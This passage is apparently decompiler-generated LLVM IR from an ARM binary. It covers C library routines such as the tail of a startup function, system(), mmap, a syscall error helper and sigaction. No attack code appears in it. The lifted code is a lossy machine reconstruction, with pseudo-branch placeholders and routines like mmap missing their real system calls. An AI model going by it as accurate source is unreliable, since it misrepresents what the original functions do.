  %v2_189a8 = inttoptr i32 %v4_18994 to i32*
  store i32 %v0_189a8, i32* %v2_189a8, align 4
  br i1 %v3_189a4, label %dec_label_pc_189b0, label %dec_label_pc_189d8

dec_label_pc_189b0:                               ; preds = %bb63
  %v0_189b0 = call i32 @getuid()
  store i32 %v0_189b0, i32* @r0, align 4
  store i32 %v0_189b0, i32* @r4, align 4
  %v0_189b8 = call i32 @geteuid()
  store i32 %v0_189b8, i32* @r0, align 4
  %v0_189bc = load i32, i32* @r4, align 4
  %v9_189bc = icmp eq i32 %v0_189bc, %v0_189b8
  store i1 %v9_189bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189bc, label %dec_label_pc_189c4, label %dec_label_pc_18a00

dec_label_pc_189c4:                               ; preds = %dec_label_pc_189b0
  %v1_189c4 = call i32 @getgid(i32 %v0_189b8)
  store i32 %v1_189c4, i32* @r0, align 4
  store i32 %v1_189c4, i32* @r4, align 4
  %v0_189cc = call i32 @getegid()
  store i32 %v0_189cc, i32* @r0, align 4
  %v0_189d0 = load i32, i32* @r4, align 4
  %v9_189d0 = icmp eq i32 %v0_189d0, %v0_189cc
  store i1 %v9_189d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189d0, label %dec_label_pc_189d8, label %dec_label_pc_18a00

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189c4, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_189a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_189a4, label %dec_label_pc_18a24, label %dec_label_pc_189e4

dec_label_pc_189e4:                               ; preds = %dec_label_pc_189d8
  store i32 %tmp52, i32* @r3, align 4
  %v9_189e8 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_189e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189e8, label %dec_label_pc_189f0, label %dec_label_pc_18a00

dec_label_pc_189f0:                               ; preds = %dec_label_pc_189e4
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_189f8 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_189f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_189f8, label %dec_label_pc_18a24, label %dec_label_pc_18a00

dec_label_pc_18a00:                               ; preds = %dec_label_pc_189e4, %dec_label_pc_189c4, %dec_label_pc_189b0, %dec_label_pc_189f0
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_18a08 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_18a14 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_18a20 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_18a20, i32* @r0, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_189f0, %dec_label_pc_189d8, %dec_label_pc_18a00
  %v0_18a24 = load i32, i32* @r7, align 4
  %v1_18a24 = inttoptr i32 %v0_18a24 to i32*
  %v2_18a24 = load i32, i32* %v1_18a24, align 4
  store i32 %v2_18a24, i32* %r2.global-to-local, align 4
  store i32 1108, i32* %r3.global-to-local, align 4
  %v1_18a2c = load i32, i32* @r6, align 4
  %v3_18a2c = add i32 %v1_18a2c, 1108
  %v4_18a2c = inttoptr i32 %v3_18a2c to i32*
  store i32 %v2_18a24, i32* %v4_18a2c, align 4
  %v0_18a30 = load i32, i32* @r7, align 4
  %v1_18a30 = inttoptr i32 %v0_18a30 to i32*
  %v2_18a30 = load i32, i32* %v1_18a30, align 4
  store i32 %v2_18a30, i32* @r4, align 4
  %v2_18a34 = icmp eq i32 %v2_18a30, 0
  store i1 %v2_18a34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a34, label %bb65, label %dec_label_pc_18a3c

dec_label_pc_18a3c:                               ; preds = %dec_label_pc_18a24
  store i32 124, i32* %r3.global-to-local, align 4
  %v0_18a40 = load i32, i32* @r6, align 4
  %v2_18a40 = add i32 %v0_18a40, 124
  %v3_18a40 = inttoptr i32 %v2_18a40 to i32*
  %v4_18a40 = load i32, i32* %v3_18a40, align 4
  store i32 %v4_18a40, i32* %r3.global-to-local, align 4
  %v2_18a44 = inttoptr i32 %v4_18a40 to i32*
  store i32 %v2_18a30, i32* %v2_18a44, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_18a4c = load i32, i32* @r7, align 4
  %v1_18a4c = inttoptr i32 %v0_18a4c to i32*
  %v2_18a4c = load i32, i32* %v1_18a4c, align 4
  %v4_18a50 = call i32 @__GI_strrchr(i32 %v2_18a4c, i32 47, i32 %v2_18a24, i32 %v4_18a40)
  store i32 %v4_18a50, i32* @r0, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v2_18a58 = icmp eq i32 %v4_18a50, 0
  store i1 %v2_18a58, i1* %cpsr_z.global-to-local, align 1
  %v0_18a5c = load i32, i32* @r6, align 4
  %v2_18a5c = add i32 %v0_18a5c, 68
  %v3_18a5c = inttoptr i32 %v2_18a5c to i32*
  %v4_18a5c = load i32, i32* %v3_18a5c, align 4
  store i32 %v4_18a5c, i32* %r2.global-to-local, align 4
  br i1 %v2_18a58, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_18a3c
  %v2_18a6448 = inttoptr i32 %v4_18a5c to i32*
  store i32 0, i32* %v2_18a6448, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_18a3c
  %v2_18a60 = add i32 %v4_18a50, 1
  store i32 %v2_18a60, i32* %r3.global-to-local, align 4
  %v2_18a64 = inttoptr i32 %v4_18a5c to i32*
  store i32 %v4_18a50, i32* %v2_18a64, align 4
  %v1_18a68 = load i32, i32* %r3.global-to-local, align 4
  %v2_18a68 = load i32, i32* %r2.global-to-local, align 4
  %v3_18a68 = inttoptr i32 %v2_18a68 to i32*
  store i32 %v1_18a68, i32* %v3_18a68, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_18a24
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_18a80 = load i32, i32* @r6, align 4
  %v2_18a80 = add i32 %v0_18a80, -32
  store i32 %v2_18a80, i32* %r8.global-to-local, align 4
  store i32 26296, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_18a90 = add i32 %v0_18a80, 26296
  %v4_18a90 = inttoptr i32 %v3_18a90 to i32*
  store i32 %arg5, i32* %v4_18a90, align 4
  %v0_18aa817 = load i32, i32* %r4.global-to-local, align 4
  %v1_18aa818 = load i32, i32* %r5.global-to-local, align 4
  %v3_18aa820 = icmp ult i32 %v0_18aa817, %v1_18aa818
  %v9_18aa826 = icmp eq i32 %v0_18aa817, %v1_18aa818
  store i1 %v9_18aa826, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18aa820, label %dec_label_pc_18a98, label %dec_label_pc_18ad8.lr.ph

dec_label_pc_18a98:                               ; preds = %dec_label_pc_18a98, %bb65
  %v1_18a98 = phi i32 [ %v1_18aa4, %dec_label_pc_18a98 ], [ %v0_18aa817, %bb65 ]
  %v0_18a98 = load i32, i32* %r8.global-to-local, align 4
  %v4_18a98 = mul i32 %v1_18a98, 4
  %v5_18a98 = add i32 %v4_18a98, %v0_18a98
  %v6_18a98 = inttoptr i32 %v5_18a98 to i32*
  %v7_18a98 = load i32, i32* %v6_18a98, align 4
  store i32 %v7_18a98, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18a98)
  %v0_18aa4 = load i32, i32* %r4.global-to-local, align 4
  %v1_18aa4 = add i32 %v0_18aa4, 1
  store i32 %v1_18aa4, i32* %r4.global-to-local, align 4
  %v1_18aa8 = load i32, i32* %r5.global-to-local, align 4
  %v3_18aa8 = icmp ult i32 %v1_18aa4, %v1_18aa8
  %v9_18aa8 = icmp eq i32 %v1_18aa4, %v1_18aa8
  store i1 %v9_18aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18aa8, label %dec_label_pc_18a98, label %dec_label_pc_18ad8.lr.ph

dec_label_pc_18ad8.lr.ph:                         ; preds = %dec_label_pc_18a98, %bb65
  %v2_18ab0 = icmp eq i32 %v0_1890c, 0
  store i1 %v2_18ab0, i1* %cpsr_z.global-to-local, align 1
  %v2_18ab8 = xor i1 %v2_18ab0, true
  call void @__pseudo_cond_branch(i1 %v2_18ab8, i32 %v0_1890c)
  store i32 -32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_18acc = load i32, i32* @r6, align 4
  %v2_18acc = add i32 %v0_18acc, -32
  store i32 %v2_18acc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18ad8

dec_label_pc_18ad8:                               ; preds = %dec_label_pc_18ad8.dec_label_pc_18ad8_crit_edge, %dec_label_pc_18ad8.lr.ph
  %v1_18ad8 = phi i32 [ %v1_18ae4, %dec_label_pc_18ad8.dec_label_pc_18ad8_crit_edge ], [ 0, %dec_label_pc_18ad8.lr.ph ]
  %v0_18ad8 = phi i32 [ %v0_18ad8.pre, %dec_label_pc_18ad8.dec_label_pc_18ad8_crit_edge ], [ %v2_18acc, %dec_label_pc_18ad8.lr.ph ]
  %v4_18ad8 = mul i32 %v1_18ad8, 4
  %v5_18ad8 = add i32 %v4_18ad8, %v0_18ad8
  %v6_18ad8 = inttoptr i32 %v5_18ad8 to i32*
  %v7_18ad8 = load i32, i32* %v6_18ad8, align 4
  store i32 %v7_18ad8, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18ad8)
  %v0_18ae4 = load i32, i32* %r4.global-to-local, align 4
  %v1_18ae4 = add i32 %v0_18ae4, 1
  store i32 %v1_18ae4, i32* %r4.global-to-local, align 4
  %v1_18ae8 = load i32, i32* %r5.global-to-local, align 4
  %v3_18ae8 = icmp ult i32 %v1_18ae4, %v1_18ae8
  %v9_18ae8 = icmp eq i32 %v1_18ae4, %v1_18ae8
  store i1 %v9_18ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18ae8, label %dec_label_pc_18ad8.dec_label_pc_18ad8_crit_edge, label %dec_label_pc_18af0

dec_label_pc_18ad8.dec_label_pc_18ad8_crit_edge:  ; preds = %dec_label_pc_18ad8
  %v0_18ad8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18ad8

dec_label_pc_18af0:                               ; preds = %dec_label_pc_18ad8
  %v0_18af4.pre = load i32, i32* @r6, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  %v2_18af4 = add i32 %v0_18af4.pre, 116
  %v3_18af4 = inttoptr i32 %v2_18af4 to i32*
  %v4_18af4 = load i32, i32* %v3_18af4, align 4
  store i32 %v4_18af4, i32* %r2.global-to-local, align 4
  store i32 %v4_18af4, i32* %r3.global-to-local, align 4
  %v2_18afc = icmp eq i32 %v4_18af4, 0
  store i1 %v2_18afc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18afc, label %dec_label_pc_18b14, label %dec_label_pc_18b04

dec_label_pc_18b04:                               ; preds = %dec_label_pc_18af0
  call void @__pseudo_branch(i32 %v4_18af4)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18b10 = load i32, i32* @r0, align 4
  %v2_18b10 = inttoptr i32 %v1_18b10 to i32*
  store i32 0, i32* %v2_18b10, align 4
  %v0_18b18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18b14

dec_label_pc_18b14:                               ; preds = %dec_label_pc_18af0, %dec_label_pc_18b04
  %v0_18b18 = phi i32 [ %v0_18af4.pre, %dec_label_pc_18af0 ], [ %v0_18b18.pre, %dec_label_pc_18b04 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_18b18 = add i32 %v0_18b18, 88
  %v3_18b18 = inttoptr i32 %v2_18b18 to i32*
  %v4_18b18 = load i32, i32* %v3_18b18, align 4
  store i32 %v4_18b18, i32* %r2.global-to-local, align 4
  store i32 %v4_18b18, i32* %r3.global-to-local, align 4
  %v2_18b20 = icmp eq i32 %v4_18b18, 0
  store i1 %v2_18b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b20, label %dec_label_pc_18b38, label %dec_label_pc_18b28

dec_label_pc_18b28:                               ; preds = %dec_label_pc_18b14
  call void @__pseudo_branch(i32 %v4_18b18)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18b34 = load i32, i32* @r0, align 4
  %v2_18b34 = inttoptr i32 %v1_18b34 to i32*
  store i32 0, i32* %v2_18b34, align 4
  %v0_18b3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18b38

dec_label_pc_18b38:                               ; preds = %dec_label_pc_18b14, %dec_label_pc_18b28
  %v0_18b3c = phi i32 [ %v0_18b18, %dec_label_pc_18b14 ], [ %v0_18b3c.pre, %dec_label_pc_18b28 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v2_18b3c = add i32 %v0_18b3c, 32
  %v3_18b3c = inttoptr i32 %v2_18b3c to i32*
  %v4_18b3c = load i32, i32* %v3_18b3c, align 4
  store i32 %v4_18b3c, i32* %r3.global-to-local, align 4
  %v0_18b40 = load i32, i32* @r7, align 4
  store i32 %v0_18b40, i32* %r1.global-to-local, align 4
  %v1_18b44 = inttoptr i32 %v4_18b3c to i32*
  %v2_18b44 = load i32, i32* %v1_18b44, align 4
  store i32 %v2_18b44, i32* %r2.global-to-local, align 4
  %v0_18b48 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_18b54 = call i32 @__GI_exit(i32 %v0_18b48)
  %v0_18b58 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b58, label %.thread3, label %.thread8

.thread3:                                         ; preds = %dec_label_pc_18b38
  %v1_18b58 = load i32, i32* %r1.global-to-local, align 4
  %v2_18b58 = load i32, i32* %r8.global-to-local, align 4
  %v5_18b58 = sub i32 32, %v2_18b58
  %v6_18b58 = shl i32 %v2_18b58, %v5_18b58
  %v9_18b58 = and i32 %v6_18b58, %v1_18b58
  store i32 %v9_18b58, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

.thread8:                                         ; preds = %dec_label_pc_18b38
  ret i32 %v1_18b54

; uselistorder directives
  uselistorder i32 %v2_18b58, { 1, 0 }
  uselistorder i32 %v0_18af4.pre, { 1, 0 }
  uselistorder i32 %v1_18ae8, { 1, 0 }
  uselistorder i32 %v1_18ae4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_18aa8, { 1, 0 }
  uselistorder i32 %v1_18aa4, { 1, 2, 3, 0 }
  uselistorder i32 %v4_18a5c, { 1, 0, 2 }
  uselistorder i1 %v8_189a4, { 1, 2, 0 }
  uselistorder i32 %v2_18974, { 1, 2, 0 }
  uselistorder i32 %v1_18970, { 1, 2, 0 }
  uselistorder i1 %v2_1895c, { 1, 0 }
  uselistorder i32 %v4_18940, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_1890c, { 1, 0 }
  uselistorder i32 %v3_188dc, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 4, 6, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 10, 9, 11, 5, 4, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 3, 11, 12, 13, 14, 15, 16, 17, 18, 5, 19, 20, 21, 22, 23, 24, 4, 6, 7, 2, 8, 9, 10, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 9, 10, 11, 3, 12, 13, 14, 2, 4, 5, 1, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 10, 11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 14, 15, 16, 17, 0, 3, 18, 1, 19, 20, 4, 5, 6, 7, 8, 9, 10, 12, 11, 2, 13 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 4, 3, 1, 2 }
  uselistorder i32 124, { 1, 2, 0, 3 }
  uselistorder i32 32770, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18b38, { 1, 0 }
  uselistorder label %dec_label_pc_18b14, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18a24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18a00, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_18974, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_1895c, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18b98 = load i32, i32* @r4, align 4
  %v0_18ba4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18ba4 = icmp eq i32 %v0_18ba4, 0
  br i1 %v2_18ba4, label %bb, label %dec_label_pc_18bbc

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cd8

dec_label_pc_18bbc:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18bc4 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18bd4 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18be4 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_18be4, i32* @r0, align 4
  %v0_18bec = call i32 @__vfork()
  store i32 %v0_18bec, i32* %r0.global-to-local, align 4
  store i32 %v0_18bec, i32* @r4, align 4
  %v1_18bf0 = icmp slt i32 %v0_18bec, 0
  br i1 %v1_18bf0, label %dec_label_pc_18bf8, label %dec_label_pc_18c24

dec_label_pc_18bf8:                               ; preds = %dec_label_pc_18bbc
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c00 = call i32 @bsd_signal(i32 3, i32 %v2_18bc4)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18c0c = call i32 @bsd_signal(i32 2, i32 %v2_18bd4)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18c18 = call i32 @bsd_signal(i32 17, i32 %v2_18be4)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cd8

dec_label_pc_18c24:                               ; preds = %dec_label_pc_18bbc
  %v2_18bf0 = icmp eq i32 %v0_18bec, 0
  br i1 %v2_18bf0, label %dec_label_pc_18c28, label %dec_label_pc_18c7c

dec_label_pc_18c28:                               ; preds = %dec_label_pc_18c24
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c30 = call i32 @bsd_signal(i32 3, i32 0)
  %v0_18c34 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18c3c = call i32 @bsd_signal(i32 2, i32 %v0_18c34)
  %v0_18c40 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18c48 = call i32 @bsd_signal(i32 17, i32 %v0_18c40)
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33880), i32* %r0.global-to-local, align 4
  %v0_18c6c = load i32, i32* @r4, align 4
  %v5_18c70 = call i32 @execl(i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33880), i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33872), i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33868), i32 %v0_18ba4, i32 %v0_18c6c)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_18c78 = call i32 @__GI__exit(i32 127)
  store i32 %v1_18c78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c7c

dec_label_pc_18c7c:                               ; preds = %dec_label_pc_18c24, %dec_label_pc_18c28
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18c84 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18c90 = call i32 @bsd_signal(i32 2, i32 1)
  %v2_18c9c = ptrtoint i32* %stack_var_-12 to i32
  %v0_18ca0 = load i32, i32* @r4, align 4
  store i32 %v0_18ca0, i32* %r0.global-to-local, align 4
  %v2_18ca4 = call i32 @wait4(i32 %v0_18ca0, i32 %v2_18c9c)
  store i32 %v2_18ca4, i32* %r0.global-to-local, align 4
  %v7_18ca8 = icmp eq i32 %v2_18ca4, -1
  br i1 %v7_18ca8, label %bb12, label %bb13

bb12:                                             ; preds = %dec_label_pc_18c7c
  store i32 %v2_18ca4, i32* %stack_var_-12, align 4
  br label %bb13

bb13:                                             ; preds = %dec_label_pc_18c7c, %bb12
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18cb8 = call i32 @bsd_signal(i32 3, i32 %v2_18bc4)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18cc4 = call i32 @bsd_signal(i32 2, i32 %v2_18bd4)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18cd0 = call i32 @bsd_signal(i32 17, i32 %v2_18be4)
  %v3_18cd4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18cd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %bb, %dec_label_pc_18bf8, %bb13
  %v1_18ce0 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_18bf8 ], [ %v3_18cd4, %bb13 ]
  store i32 %v3_18b98, i32* @r4, align 4
  ret i32 %v1_18ce0

; uselistorder directives
  uselistorder i32 %v2_18ca4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 0, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_2c158.876 to i16) to i32), i32 -33880), { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_18cd8, { 2, 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %dec_label_pc_18c7c, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18cf4 = load i32, i32* @r4, align 4
  store i32 %v3_18cf4, i32* %stack_var_-16, align 4
  %v3_18d00 = urem i32 %arg3, 4096
  %v2_18d04 = icmp eq i32 %v3_18d00, 0
  br i1 %v2_18d04, label %dec_label_pc_18d20, label %dec_label_pc_18d0c

dec_label_pc_18d0c:                               ; preds = %entry
  %v0_18d0c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_18d18 = inttoptr i32 %v0_18d0c to i32*
  store i32 22, i32* %v2_18d18, align 4
  %v0_18d50.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d50

dec_label_pc_18d20:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18d4c, label %dec_label_pc_18d3c

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d20
  %v0_18d3c = call i32 @__GI___errno_location()
  %v0_18d40 = load i32, i32* %r4.global-to-local, align 4
  %v1_18d40 = sub i32 0, %v0_18d40
  %v2_18d44 = inttoptr i32 %v0_18d3c to i32*
  store i32 %v1_18d40, i32* %v2_18d44, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18d4c

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18d20, %dec_label_pc_18d3c
  %v0_18d4c = phi i32 [ %arg1, %dec_label_pc_18d20 ], [ -1, %dec_label_pc_18d3c ]
  store i32 %v0_18d4c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d50

dec_label_pc_18d50:                               ; preds = %dec_label_pc_18d0c, %dec_label_pc_18d4c
  %v0_18d50 = phi i32 [ %v0_18d50.pre, %dec_label_pc_18d0c ], [ %v0_18d4c, %dec_label_pc_18d4c ]
  %v2_18d54 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18d54, i32* @r4, align 4
  ret i32 %v0_18d50

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18d50, { 1, 0 }
  uselistorder label %dec_label_pc_18d4c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_18d5c = load i32, i32* @r4, align 4
  store i32 %v3_18d5c, i32* %stack_var_-8, align 4
  %v0_18d60 = load i32, i32* @r0, align 4
  %v0_18d64 = call i32 @__GI___errno_location()
  %v1_18d68 = sub i32 0, %v0_18d60
  %v2_18d6c = inttoptr i32 %v0_18d64 to i32*
  store i32 %v1_18d68, i32* %v2_18d6c, align 4
  %v2_18d74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18d74, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18d7c = load i32, i32* @r4, align 4
  %v6_18d7c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_18d84 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_18d84, label %dec_label_pc_18dd8, label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %entry
  %v1_18d9c = add i32 %arg2, 4
  %v2_18d9c = inttoptr i32 %v1_18d9c to i32*
  %v3_18d9c = load i32, i32* %v2_18d9c, align 4
  store i32 %v3_18d9c, i32* @r3, align 4
  %v1_18da0 = and i32 %v3_18d9c, 67108864
  %v2_18da0 = icmp eq i32 %v1_18da0, 0
  br i1 %v2_18da0, label %dec_label_pc_18da8, label %dec_label_pc_18dd8

dec_label_pc_18da8:                               ; preds = %dec_label_pc_18d9c
  store i32 20, i32* @r2, align 4
  %v2_18dac = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_18dac, i32* @r0, align 4
  %v0_18db0 = call i32 @memcpy()
  %v0_18dd8.pre = load i32, i32* @r5, align 4
  %v0_18de0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %dec_label_pc_18d9c, %entry, %dec_label_pc_18da8
  %v0_18de0 = phi i32 [ %arg3, %dec_label_pc_18d9c ], [ %arg3, %entry ], [ %v0_18de0.pre, %dec_label_pc_18da8 ]
  %v0_18ddc = phi i32 [ %arg2, %dec_label_pc_18d9c ], [ 0, %entry ], [ %v2_18dac, %dec_label_pc_18da8 ]
  %v0_18dd8 = phi i32 [ %arg1, %dec_label_pc_18d9c ], [ %arg1, %entry ], [ %v0_18dd8.pre, %dec_label_pc_18da8 ]
  %v4_18de8 = call i32 @__syscall_rt_sigaction(i32 %v0_18dd8, i32 %v0_18ddc, i32 %v0_18de0, i32 8)
  store i32 %v3_18d7c, i32* @r4, align 4
  store i32 %v6_18d7c, i32* @r5, align 4
  ret i32 %v4_18de8

; uselistorder directives
  uselistorder label %dec_label_pc_18dd8, { 2, 0, 1 }
}

define i32 @function_18dfc(i32 %arg1) local_unnamed_addr {
dec_label_pc_18dfc:
  %v0_18dfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18dfc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18dfc
  %v2_18dfc = load i32, i32* @ip, align 4
  %v8_18dfc = ashr i32 %v2_18dfc, %arg1
  %v9_18dfc = and i32 %v8_18dfc, %arg1
  %v2_18e00 = load i32, i32* @r4, align 4
  %v8_18e00 = ashr i32 %v2_18e00, %v9_18dfc
  %v9_18e00 = and i32 %v8_18e00, %v9_18dfc
